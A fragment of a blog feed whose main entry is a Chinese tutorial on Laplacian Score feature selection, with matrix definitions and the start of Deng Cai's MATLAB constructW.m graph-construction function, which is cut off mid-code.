rel="noopener">http://xuesql.cn/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特征选择 LaplacianScore</title>
      <link href="/2020/11/03/%E7%89%B9%E5%BE%81%E9%80%89%E6%8B%A9-Laplacian-Score/"/>
      <url>/2020/11/03/%E7%89%B9%E5%BE%81%E9%80%89%E6%8B%A9-Laplacian-Score/</url>
      
        <content type="html"><![CDATA[<p>特征选择方法Laplacian Score</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>上次介绍了<a href="">一种特征选择方法：FisherScore</a>，但是没有介绍特征选择，更没有介绍特征工程。这里上一张别人的图简单介绍一下整个框架（找找特征选择在哪）。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211130140417.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="Laplacian-Score"><a href="#Laplacian-Score" class="headerlink" title="Laplacian Score"></a>Laplacian Score</h2><p>数据集$X={x_{ij} }$,$i=1,2…n;j=1,2…d.$其中$n$为样本数，$d$为样本特征数。标签信息$y_k,k={1,2…c}$,其中$c$为类簇数，$d_k^{ii’}$表示样本$i$与样本$i’$之间最近邻$k$个样本的最大距离。</p><p>构建无向权重图$G(V,E)$，其节点由图集$V=x_i$构成，样本间的近邻关系表示为图的边形成边集$E$。如果$||x_i-x_i^{‘}||\le d_k^{ii’}$，则样本$i$与样本$i’$连接成边。可定义下生成相似度矩阵 ：<br>$$<br>S_{ii’} =<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>            \dfrac{1}{n_k} , &amp; y_i=y_{i’}=k \<br>             0,&amp; 其他\  </p><div class="hljs code-wrapper"><pre><code>\end{array}  </code></pre></div><p>\right.<br>$$<br>定义$L_0$为无向权重图$G$中的拉普拉斯矩阵，令邻接矩阵$W_{ii’}=S_{ii’}(1\le i,i’ \le n)$，$W$是对称矩阵，其度矩阵$D$为：<br>$$<br>D_{ii’} =<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>            \sum_{i’=1}^n W_{ii’} , &amp; i’= i \<br>             0,&amp; i’ \not=i \  </p><div class="hljs code-wrapper"><pre><code>\end{array}  </code></pre></div><p>\right.<br>$$<br>​        度矩阵反映企业样本周围聚集其他样本的密度，值越大则说明密度越大，由度矩阵与邻接矩阵可得到拉普拉斯矩阵$L$、        正则化的拉普拉斯矩阵$\delta$，计算拉普拉斯评分。<br>$$<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>            L = D-S  \<br>            \delta = D^{-\frac{1}{2}} L D^{-\frac{1}{2}} \  </p><div class="hljs code-wrapper"><pre><code>\end{array}  </code></pre></div><p>\right.<br>$$<br>其中$s_j$表示第$j$个特征$x_j$的期望值，定义如下：<br>$$<br>s_j = \sum(x_{ij} \dfrac{D_{ii}}{\sum_i D_{ii}} ) = \dfrac{ \sum_i x_{ij} D_{ii}}{\sum_i D_{ii}}<br>$$<br>$s_j$即为各个特征的评分，评分越高，表示该特征对标签影响程度越大。</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><h3 id="constructW-m"><a href="#constructW-m" class="headerlink" title="constructW.m"></a>constructW.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">W</span> = <span class="hljs-title">constructW</span><span class="hljs-params">(fea,options)</span></span><span class="hljs-comment">%Usage:</span><span class="hljs-comment">%W = constructW(fea,options)</span><span class="hljs-comment">%</span><span class="hljs-comment">%fea: Rows of vectors of data points. Each row is x_i</span><span class="hljs-comment">%   options: Struct value in Matlab. The fields in options that can be set:</span><span class="hljs-comment">%                  </span><span class="hljs-comment">%           NeighborMode -  Indicates how to construct the graph. Choices</span><span class="hljs-comment">%                           are: [Default 'KNN']</span><span class="hljs-comment">%                'KNN'            -  k = 0</span><span class="hljs-comment">%                                       Complete graph</span><span class="hljs-comment">%                                    k &gt; 0</span><span class="hljs-comment">%                                      Put an edge between two nodes if and</span><span class="hljs-comment">%                                      only if they are among the k nearst</span><span class="hljs-comment">%                                      neighbors of each other. You are</span><span class="hljs-comment">%                                      required to provide the parameter k in</span><span class="hljs-comment">%                                      the options. Default k=5.</span><span class="hljs-comment">%               'Supervised'      -  k = 0</span><span class="hljs-comment">%                                       Put an edge between two nodes if and</span><span class="hljs-comment">%                                       only if they belong to same class. </span><span class="hljs-comment">%                                    k &gt; 0</span><span class="hljs-comment">%                                       Put an edge between two nodes if</span><span class="hljs-comment">%                                       they belong to same class and they</span><span class="hljs-comment">%                                       are among the k nearst neighbors of</span><span class="hljs-comment">%                                       each other. </span><span class="hljs-comment">%                                    Default: k=0</span><span class="hljs-comment">%                                   You are required to provide the label</span><span class="hljs-comment">%                                   information gnd in the options.</span><span class="hljs-comment">%                                              </span><span class="hljs-comment">%           WeightMode   -  Indicates how to assign weights for each edge</span><span class="hljs-comment">%                           in the graph. Choices are:</span><span class="hljs-comment">%               'Binary'       - 0-1 weighting. Every edge receiveds weight</span><span class="hljs-comment">%                                of 1. </span><span class="hljs-comment">%               'HeatKernel'   - If nodes i and j are connected, put weight</span><span class="hljs-comment">%                                W_ij = exp(-norm(x_i - x_j)/2t^2). You are </span><span class="hljs-comment">%                                required to provide the parameter t. [Default One]</span><span class="hljs-comment">%               'Cosine'       - If nodes i and j are connected, put weight</span><span class="hljs-comment">%                                cosine(x_i,x_j). </span><span class="hljs-comment">%               </span><span class="hljs-comment">%            k         -   The parameter needed under 'KNN' NeighborMode.</span><span class="hljs-comment">%                          Default will be 5.</span><span class="hljs-comment">%            gnd       -   The parameter needed under 'Supervised'</span><span class="hljs-comment">%                          NeighborMode.  Colunm vector of the label</span><span class="hljs-comment">%                          information for each data point.</span><span class="hljs-comment">%            bLDA      -   0 or 1. Only effective under 'Supervised'</span><span class="hljs-comment">%                          NeighborMode. If 1, the graph will be constructed</span><span class="hljs-comment">%                          to make LPP exactly same as LDA. Default will be</span><span class="hljs-comment">%                          0. </span><span class="hljs-comment">%            t         -   The parameter needed under 'HeatKernel'</span><span class="hljs-comment">%                          WeightMode. Default will be 1</span><span class="hljs-comment">%         bNormalized  -   0 or 1. Only effective under 'Cosine' WeightMode.</span><span class="hljs-comment">%                          Indicates whether the fea are already be</span><span class="hljs-comment">%                          normalized to 1. Default will be 0</span><span class="hljs-comment">%      bSelfConnected  -   0 or 1. Indicates whether W(i,i) == 1. Default 0</span><span class="hljs-comment">%                          if 'Supervised' NeighborMode &amp; bLDA == 1,</span><span class="hljs-comment">%                          bSelfConnected will always be 1. Default 0.</span><span class="hljs-comment">%            bTrueKNN  -   0 or 1. If 1, will construct a truly kNN graph</span><span class="hljs-comment">%                          (Not symmetric!). Default will be 0. Only valid</span><span class="hljs-comment">%                          for 'KNN' NeighborMode</span><span class="hljs-comment">%</span><span class="hljs-comment">%</span><span class="hljs-comment">%    Examples:</span><span class="hljs-comment">%</span><span class="hljs-comment">%       fea = rand(50,15);</span><span class="hljs-comment">%       options = [];</span><span class="hljs-comment">%       options.NeighborMode = 'KNN';</span><span class="hljs-comment">%       options.k = 5;</span><span class="hljs-comment">%       options.WeightMode = 'HeatKernel';</span><span class="hljs-comment">%       options.t = 1;</span><span class="hljs-comment">%       W = constructW(fea,options);</span><span class="hljs-comment">%       </span><span class="hljs-comment">%       </span><span class="hljs-comment">%       fea = rand(50,15);</span><span class="hljs-comment">%       gnd = [ones(10,1);ones(15,1)*2;ones(10,1)*3;ones(15,1)*4];</span><span class="hljs-comment">%       options = [];</span><span class="hljs-comment">%       options.NeighborMode = 'Supervised';</span><span class="hljs-comment">%       options.gnd = gnd;</span><span class="hljs-comment">%       options.WeightMode = 'HeatKernel';</span><span class="hljs-comment">%       options.t = 1;</span><span class="hljs-comment">%       W = constructW(fea,options);</span><span class="hljs-comment">%       </span><span class="hljs-comment">%       </span><span class="hljs-comment">%       fea = rand(50,15);</span><span class="hljs-comment">%       gnd = [ones(10,1);ones(15,1)*2;ones(10,1)*3;ones(15,1)*4];</span><span class="hljs-comment">%       options = [];</span><span class="hljs-comment">%       options.NeighborMode = 'Supervised';</span><span class="hljs-comment">%       options.gnd = gnd;</span><span class="hljs-comment">%       options.bLDA = 1;</span><span class="hljs-comment">%       W = constructW(fea,options);      </span><span class="hljs-comment">%       </span><span class="hljs-comment">%</span><span class="hljs-comment">%    For more details about the different ways to construct the W, please</span><span class="hljs-comment">%    refer:</span><span class="hljs-comment">%       Deng Cai, Xiaofei He and Jiawei Han, "Document Clustering Using</span><span class="hljs-comment">%       Locality Preserving Indexing" IEEE TKDE, Dec. 2005.</span><span class="hljs-comment">%    </span><span class="hljs-comment">%</span><span class="hljs-comment">%    Written by Deng Cai (dengcai2 AT cs.uiuc.edu), April/2004, Feb/2006,</span><span class="hljs-comment">%                                             May/2007</span><span class="hljs-comment">% </span>bSpeed  = <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (~exist(<span class="hljs-string">'options'</span>,<span class="hljs-string">'var'</span>))   options = [];<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> isfield(options,<span class="hljs-string">'Metric'</span>)    warning(<span class="hljs-string">'This function has been changed and the Metric is no longer be supported'</span>);<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'bNormalized'</span>)    options.bNormalized = <span class="hljs-number">0</span>;<span class="hljs-keyword">end</span><span class="hljs-comment">%=================================================</span><span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'NeighborMode'</span>)    options.NeighborMode = <span class="hljs-string">'KNN'</span>;<span class="hljs-keyword">end</span><span class="hljs-keyword">switch</span> lower(options.NeighborMode)    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'KNN'</span>)}  <span class="hljs-comment">%For simplicity, we include the data point itself in the kNN</span>        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'k'</span>)            options.k = <span class="hljs-number">5</span>;        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Supervised'</span>)}        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'bLDA'</span>)            options.bLDA = <span class="hljs-number">0</span>;        <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> options.bLDA            options.bSelfConnected = <span class="hljs-number">1</span>;        <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'k'</span>)            options.k = <span class="hljs-number">0</span>;        <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'gnd'</span>)            error(<span class="hljs-string">'Label(gnd) should be provided under ''Supervised'' NeighborMode!'</span>);        <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> ~<span class="hljs-built_in">isempty</span>(fea) &amp;&amp; <span class="hljs-built_in">length</span>(options.gnd) ~= <span class="hljs-built_in">size</span>(fea,<span class="hljs-number">1</span>)            error(<span class="hljs-string">'gnd doesn''t match with fea!'</span>);        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">otherwise</span>        error(<span class="hljs-string">'NeighborMode does not exist!'</span>);<span class="hljs-keyword">end</span><span class="hljs-comment">%=================================================</span><span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'WeightMode'</span>)    options.WeightMode = <span class="hljs-string">'HeatKernel'</span>;<span class="hljs-keyword">end</span>bBinary = <span class="hljs-number">0</span>;bCosine = <span class="hljs-number">0</span>;<span class="hljs-keyword">switch</span> lower(options.WeightMode)    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Binary'</span>)}        bBinary = <span class="hljs-number">1</span>;     <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'HeatKernel'</span>)}        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'t'</span>)            nSmp = <span class="hljs-built_in">size</span>(fea,<span class="hljs-number">1</span>);            <span class="hljs-keyword">if</span> nSmp &gt; <span class="hljs-number">3000</span>                D = EuDist2(fea(randsample(nSmp,<span class="hljs-number">3000</span>),:));            <span class="hljs-keyword">else</span>                D = EuDist2(fea);            <span class="hljs-keyword">end</span>            options.t = <span class="hljs-built_in">mean</span>(<span class="hljs-built_in">mean</span>(D));        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Cosine'</span>)}        bCosine = <span class="hljs-number">1</span>;    <span class="hljs-keyword">otherwise</span>        error(<span class="hljs-string">'WeightMode does not exist!'</span>);<span class="hljs-keyword">end</span><span class="hljs-comment">%=================================================</span><span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'bSelfConnected'</span>)    options.bSelfConnected = <span class="hljs-number">0</span>;<span class="hljs-keyword">end</span><span class="hljs-comment">%=================================================</span><span class="hljs-keyword">if</span> isfield(options,<span class="hljs-string">'gnd'</span>)     nSmp = <span class="hljs-built_in">length</span>(options.gnd);<span class="hljs-keyword">else</span>    nSmp = <span class="hljs-built_in">size</span>(fea,<span class="hljs-number">1</span>);<span class="hljs-keyword">end</span>maxM = <span class="hljs-number">62500000</span>; <span class="hljs-comment">%500M</span>BlockSize = <span class="hljs-built_in">floor</span>(maxM/(nSmp*<span class="hljs-number">3</span>));<span class="hljs-keyword">if</span> strcmpi(options.NeighborMode,<span class="hljs-string">'Supervised'</span>)    Label = unique(options.gnd);    nLabel = <span class="hljs-built_in">length</span>(Label);    <span class="hljs-keyword">if</span> options.bLDA        G = <span class="hljs-built_in">zeros</span>(nSmp,nSmp);        <span class="hljs-keyword">for</span> idx=<span class="hljs-number">1</span>:nLabel            classIdx = options.gnd==Label(idx);            G(classIdx,classIdx) = <span class="hljs-number">1</span>/sum(classIdx);        <span class="hljs-keyword">end</span>        W = sparse(G);        <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">end</span>        <span class="hljs-keyword">switch</span> lower(options.WeightMode)        <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Binary'</span>)}            <span class="hljs-keyword">if</span> options.k &gt; <span class="hljs-number">0</span>                G = <span class="hljs-built_in">zeros</span>(nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>);                idNow = <span class="hljs-number">0</span>;                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    D = EuDist2(fea(classIdx,:),[],<span class="hljs-number">0</span>);                    [dump idx] = <span class="hljs-built_in">sort</span>(D,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    clear D dump;                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                                        nSmpClass = <span class="hljs-built_in">length</span>(classIdx)*(options.k+<span class="hljs-number">1</span>);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(classIdx,[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">2</span>) = classIdx(idx(:));                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">3</span>) = <span class="hljs-number">1</span>;                    idNow = idNow+nSmpClass;                    clear idx                <span class="hljs-keyword">end</span>                G = sparse(G(:,<span class="hljs-number">1</span>),G(:,<span class="hljs-number">2</span>),G(:,<span class="hljs-number">3</span>),nSmp,nSmp);                G = <span class="hljs-built_in">max</span>(G,G');            <span class="hljs-keyword">else</span>                G = <span class="hljs-built_in">zeros</span>(nSmp,nSmp);                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    G(classIdx,classIdx) = <span class="hljs-number">1</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>                        <span class="hljs-keyword">if</span> ~options.bSelfConnected                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(G,<span class="hljs-number">1</span>)                    G(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">i</span>) = <span class="hljs-number">0</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>                        W = sparse(G);        <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'HeatKernel'</span>)}            <span class="hljs-keyword">if</span> options.k &gt; <span class="hljs-number">0</span>                G = <span class="hljs-built_in">zeros</span>(nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>);                idNow = <span class="hljs-number">0</span>;                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    D = EuDist2(fea(classIdx,:),[],<span class="hljs-number">0</span>);                    [dump idx] = <span class="hljs-built_in">sort</span>(D,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    clear D;                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = <span class="hljs-built_in">exp</span>(-dump/(<span class="hljs-number">2</span>*options.t^<span class="hljs-number">2</span>));                                        nSmpClass = <span class="hljs-built_in">length</span>(classIdx)*(options.k+<span class="hljs-number">1</span>);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(classIdx,[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">2</span>) = classIdx(idx(:));                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">3</span>) = dump(:);                    idNow = idNow+nSmpClass;                    clear dump idx                <span class="hljs-keyword">end</span>                G = sparse(G(:,<span class="hljs-number">1</span>),G(:,<span class="hljs-number">2</span>),G(:,<span class="hljs-number">3</span>),nSmp,nSmp);            <span class="hljs-keyword">else</span>                G = <span class="hljs-built_in">zeros</span>(nSmp,nSmp);                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    D = EuDist2(fea(classIdx,:),[],<span class="hljs-number">0</span>);                    D = <span class="hljs-built_in">exp</span>(-D/(<span class="hljs-number">2</span>*options.t^<span class="hljs-number">2</span>));                    G(classIdx,classIdx) = D;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>                        <span class="hljs-keyword">if</span> ~options.bSelfConnected                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(G,<span class="hljs-number">1</span>)                    G(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">i</span>) = <span class="hljs-number">0</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>            W = sparse(<span class="hljs-built_in">max</span>(G,G'));        <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Cosine'</span>)}            <span class="hljs-keyword">if</span> ~options.bNormalized                fea = NormalizeFea(fea);            <span class="hljs-keyword">end</span>            <span class="hljs-keyword">if</span> options.k &gt; <span class="hljs-number">0</span>                G = <span class="hljs-built_in">zeros</span>(nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>);                idNow = <span class="hljs-number">0</span>;                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    D = fea(classIdx,:)*fea(classIdx,:)';                    [dump idx] = <span class="hljs-built_in">sort</span>(-D,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    clear D;                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = -dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                                        nSmpClass = <span class="hljs-built_in">length</span>(classIdx)*(options.k+<span class="hljs-number">1</span>);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(classIdx,[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">2</span>) = classIdx(idx(:));                    G(idNow+<span class="hljs-number">1</span>:nSmpClass+idNow,<span class="hljs-number">3</span>) = dump(:);                    idNow = idNow+nSmpClass;                    clear dump idx                <span class="hljs-keyword">end</span>                G = sparse(G(:,<span class="hljs-number">1</span>),G(:,<span class="hljs-number">2</span>),G(:,<span class="hljs-number">3</span>),nSmp,nSmp);            <span class="hljs-keyword">else</span>                G = <span class="hljs-built_in">zeros</span>(nSmp,nSmp);                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:nLabel                    classIdx = <span class="hljs-built_in">find</span>(options.gnd==Label(<span class="hljs-built_in">i</span>));                    G(classIdx,classIdx) = fea(classIdx,:)*fea(classIdx,:)';                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>            <span class="hljs-keyword">if</span> ~options.bSelfConnected                <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(G,<span class="hljs-number">1</span>)                    G(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">i</span>) = <span class="hljs-number">0</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>            W = sparse(<span class="hljs-built_in">max</span>(G,G'));        <span class="hljs-keyword">otherwise</span>            error(<span class="hljs-string">'WeightMode does not exist!'</span>);    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">return</span>;<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> bCosine &amp;&amp; ~options.bNormalized    Normfea = NormalizeFea(fea);<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> strcmpi(options.NeighborMode,<span class="hljs-string">'KNN'</span>) &amp;&amp; (options.k &gt; <span class="hljs-number">0</span>)    <span class="hljs-keyword">if</span> ~(bCosine &amp;&amp; options.bNormalized)        G = <span class="hljs-built_in">zeros</span>(nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>);        <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">ceil</span>(nSmp/BlockSize)            <span class="hljs-keyword">if</span> <span class="hljs-built_in">i</span> == <span class="hljs-built_in">ceil</span>(nSmp/BlockSize)                smpIdx = (<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize+<span class="hljs-number">1</span>:nSmp;                dist = EuDist2(fea(smpIdx,:),fea,<span class="hljs-number">0</span>);                <span class="hljs-keyword">if</span> bSpeed                    nSmpNow = <span class="hljs-built_in">length</span>(smpIdx);                    dump = <span class="hljs-built_in">zeros</span>(nSmpNow,options.k+<span class="hljs-number">1</span>);                    idx = dump;                    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>                        [dump(:,<span class="hljs-built_in">j</span>),idx(:,<span class="hljs-built_in">j</span>)] = <span class="hljs-built_in">min</span>(dist,[],<span class="hljs-number">2</span>);                        temp = (idx(:,<span class="hljs-built_in">j</span>)<span class="hljs-number">-1</span>)*nSmpNow+[<span class="hljs-number">1</span>:nSmpNow]';                        dist(temp) = <span class="hljs-number">1e100</span>;                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">else</span>                    [dump idx] = <span class="hljs-built_in">sort</span>(dist,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                <span class="hljs-keyword">end</span>                                <span class="hljs-keyword">if</span> ~bBinary                    <span class="hljs-keyword">if</span> bCosine                        dist = Normfea(smpIdx,:)*Normfea';                        dist = full(dist);                        linidx = [<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(idx,<span class="hljs-number">1</span>)]';                        dump = dist(<span class="hljs-built_in">sub2ind</span>(<span class="hljs-built_in">size</span>(dist),linidx(:,<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">size</span>(idx,<span class="hljs-number">2</span>))),idx));                    <span class="hljs-keyword">else</span>                        dump = <span class="hljs-built_in">exp</span>(-dump/(<span class="hljs-number">2</span>*options.t^<span class="hljs-number">2</span>));                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">end</span>                                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(smpIdx',[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">2</span>) = idx(:);                <span class="hljs-keyword">if</span> ~bBinary                    G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = dump(:);                <span class="hljs-keyword">else</span>                    G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = <span class="hljs-number">1</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">else</span>                smpIdx = (<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize;                            dist = EuDist2(fea(smpIdx,:),fea,<span class="hljs-number">0</span>);                                <span class="hljs-keyword">if</span> bSpeed                    nSmpNow = <span class="hljs-built_in">length</span>(smpIdx);                    dump = <span class="hljs-built_in">zeros</span>(nSmpNow,options.k+<span class="hljs-number">1</span>);                    idx = dump;                    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>                        [dump(:,<span class="hljs-built_in">j</span>),idx(:,<span class="hljs-built_in">j</span>)] = <span class="hljs-built_in">min</span>(dist,[],<span class="hljs-number">2</span>);                        temp = (idx(:,<span class="hljs-built_in">j</span>)<span class="hljs-number">-1</span>)*nSmpNow+[<span class="hljs-number">1</span>:nSmpNow]';                        dist(temp) = <span class="hljs-number">1e100</span>;                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">else</span>                    [dump idx] = <span class="hljs-built_in">sort</span>(dist,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                <span class="hljs-keyword">end</span>                                <span class="hljs-keyword">if</span> ~bBinary                    <span class="hljs-keyword">if</span> bCosine                        dist = Normfea(smpIdx,:)*Normfea';                        dist = full(dist);                        linidx = [<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(idx,<span class="hljs-number">1</span>)]';                        dump = dist(<span class="hljs-built_in">sub2ind</span>(<span class="hljs-built_in">size</span>(dist),linidx(:,<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">size</span>(idx,<span class="hljs-number">2</span>))),idx));                    <span class="hljs-keyword">else</span>                        dump = <span class="hljs-built_in">exp</span>(-dump/(<span class="hljs-number">2</span>*options.t^<span class="hljs-number">2</span>));                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">end</span>                                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(smpIdx',[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">2</span>) = idx(:);                <span class="hljs-keyword">if</span> ~bBinary                    G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span 